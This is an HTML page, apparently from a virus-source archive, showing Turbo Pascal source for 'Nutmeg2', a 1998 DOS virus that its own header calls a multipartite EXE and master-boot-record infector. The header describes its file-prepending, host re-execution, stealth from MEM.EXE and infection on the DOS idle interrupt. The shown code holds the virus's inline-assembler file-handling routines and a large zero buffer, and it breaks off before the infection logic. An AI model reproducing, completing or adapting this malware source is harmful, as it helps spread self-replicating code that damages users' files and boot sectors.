<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Multi.Nutmeg.4096 - nutmeg2.pas.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
	color: #808080;
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc14 {
	font-weight: bold;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">{
[Nutmeg2] Turbo Pascal Multipartite EXE/MBR infector
Copyright 1998 (c) Vecna

This is the first know virus written in HLL that infect the MBR also. It
infect the owner of the envirment in each interupt 0x28 call, that is called
when DOS is idle. The virus place itself in the start of the infected file,
adding 4096 bytes to it. It is a prepender that reexecute the host, but with
the original name, so, if the host program goes memory resident, MEM.EXE dont
show a foreign program as resident. It also have the so called "host stealth",
infecting all files, including these with self-checks. Two external assembler
routines are used to give the virus the multipartite ability. The virus is
packed with LZEXE, and replicate in this form.

Two big ugly buffers are used as a temporary storage area when copying and
working in the MBR. As the file is packed, altought using big memory spaces,
they dont increase the file lenght.

}</span><span class="sc0">

</span><span class="sc9">{$F+}</span><span class="sc0">
</span><span class="sc9">{$S-}</span><span class="sc0">
</span><span class="sc9">{$M 8192,0,0}</span><span class="sc0">

</span><span class="sc5">PROGRAM</span><span class="sc0"> </span><span class="sc11">NUTMEG</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">USES</span><span class="sc0"> </span><span class="sc11">DOS</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">CONST</span><span class="sc0"> </span><span class="sc11">VIRSIZE</span><span class="sc10">=</span><span class="sc4">4096</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">TYPE</span><span class="sc0"> </span><span class="sc11">BUFFER</span><span class="sc10">=</span><span class="sc5">ARRAY</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc11">VIRSIZE</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">OF</span><span class="sc0"> </span><span class="sc11">CHAR</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">VAR</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ENVSEG</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ENVOFF</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PSPSEG</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILENAME</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">MYNAME</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">OLDNAME</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">MYPARAMS</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">VIRBUFFER</span><span class="sc10">:</span><span class="sc11">BUFFER</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">AEXEC</span><span class="sc10">:</span><span class="sc11">BOOLEAN</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">GETSEGMENTS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  MOV AH, 51H
  INT 21H
  MOV ES, BX
  MOV ES, ES:[2CH]
  MOV ENVSEG, ES
  MOV PSPSEG, BX
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">FSEEK</span><span class="sc10">(</span><span class="sc11">POINTER</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  MOV AX, 4200H
  MOV BX, HANDLE
  XOR CX, CX
  MOV DX, POINTER
  INT 21H
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">READFILE</span><span class="sc10">(</span><span class="sc5">VAR</span><span class="sc0"> </span><span class="sc11">FILEBUF</span><span class="sc10">:</span><span class="sc11">BUFFER</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">READNUM</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  PUSH DS
  MOV AH, 3FH
  MOV BX, HANDLE
  MOV CX, READNUM
  LDS DX, FILEBUF
  INT 21H
  POP DS
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">WRITEFILE</span><span class="sc10">(</span><span class="sc11">FILEBUF</span><span class="sc10">:</span><span class="sc11">BUFFER</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">WRITENUM</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  PUSH DS
  MOV AH, 40H
  MOV BX, HANDLE
  MOV CX, WRITENUM
  LDS DX, FILEBUF
  INT 21H
  POP DS
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">OPENFILE</span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ACCESS</span><span class="sc10">:</span><span class="sc11">BYTE</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  PUSH DS
  MOV AH, 3DH
  MOV AL, ACCESS
  LDS DX, FILENAME
  INC DX
  INT 21H
  MOV HANDLE, AX
  POP DS
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">ERASEFILE</span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  PUSH DS
  MOV AH, 41H
  LDS DX, FILENAME
  INC DX
  INT 21H
  POP DS
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">CLOSEFILE</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  MOV AH, 3EH
  MOV BX, HANDLE
  INT 21H
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">CREATENEWFILE</span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ATTRIBUTES</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  PUSH DS
  MOV AH, 3CH
  MOV CX, ATTRIBUTES
  LDS DX, FILENAME
  INC DX
  INT 21H
  MOV HANDLE, AX
  POP DS
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">RENAMEFILE</span><span class="sc10">(</span><span class="sc11">SOURCE</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">;</span><span class="sc11">DESTINATION</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  PUSH DS
  MOV AH, 56H
  LDS DX, SOURCE
  INC DX
  LES DI, DESTINATION
  INC DI
  INT 21H
  POP DS
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">COPYTO</span><span class="sc10">(</span><span class="sc11">DESTINATION</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SOURCE</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">STARTAT</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ASSEMBLER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">VAR</span><span class="sc0"> </span><span class="sc11">HANDLE1</span><span class="sc10">,</span><span class="sc11">HANDLE2</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">ASM</span><span class="sc14">
  PUSH DS
  MOV AX,3D00H
  LDS DX,SOURCE
  INC DX
  INT 21H
  MOV HANDLE1, AX
  MOV AX,3D02H
  LDS DX,DESTINATION
  INC DX
  INT 21H
  MOV HANDLE2, AX
  MOV AX, 4200H
  MOV BX, HANDLE1
  XOR CX, CX
  MOV DX, STARTAT
  INT 21H
  MOV AX, 4202H
  MOV BX, HANDLE2
  XOR CX, CX
  CWD
  INT 21H
  PUSH CS
  POP DS
  MOV DX, OFFSET @BUFFER
@NEXTCHUNK:
  MOV AH, 3FH
  MOV BX, HANDLE1
  MOV CX, 16*64*4
  INT 21H
  MOV CX, AX
  MOV AH, 40H
  MOV BX, HANDLE2
  INT 21H
  CMP AX, 16*64*4
  JE @NEXTCHUNK
  MOV AH, 3EH
  MOV BX, HANDLE1
  INT 21H
  MOV AH, 3EH
  MOV BX, HANDLE2
  INT 21H
  JMP @EXIT
@BUFFER:
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
  DB 00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
@EXIT:
  POP DS
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

